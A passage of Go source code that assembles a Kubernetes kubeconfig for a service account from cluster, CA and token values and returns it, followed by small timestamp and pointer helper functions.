	contextName := saName + "@" + clusterName

	cfg := clientcmdapi.Config{
		Kind:       "Config",
		APIVersion: "v1",
		Clusters: map[string]*clientcmdapi.Cluster{
			clusterName: {
				Server:                   serverURL,
				CertificateAuthorityData: []byte(caData),
			},
		},
		Contexts: map[string]*clientcmdapi.Context{
			contextName: {
				Cluster:   clusterName,
				Namespace: namespace,
				AuthInfo:  saName,
			},
		},
		CurrentContext: contextName,
		AuthInfos: map[string]*clientcmdapi.AuthInfo{
			saName: {
				Token: token,
			},
		},
	}

	kubeconfigBytes, err := clientcmd.Write(cfg)
	if err != nil {
		return nil, fmt.Errorf("marshal kubeconfig: %w", err)
	}

	return &KubeconfigResult{
		SA:         saName,
		Namespace:  namespace,
		Token:      token,
		Kubeconfig: string(kubeconfigBytes),
	}, nil
}

// ==================== Helpers ====================

func formatTimestamp(t time.Time) string {
	if t.IsZero() {
		return ""
	}
	return t.UTC().Format(time.RFC3339Nano)
}

func int32Ptr(i int32) *int32 {
	return &i
}
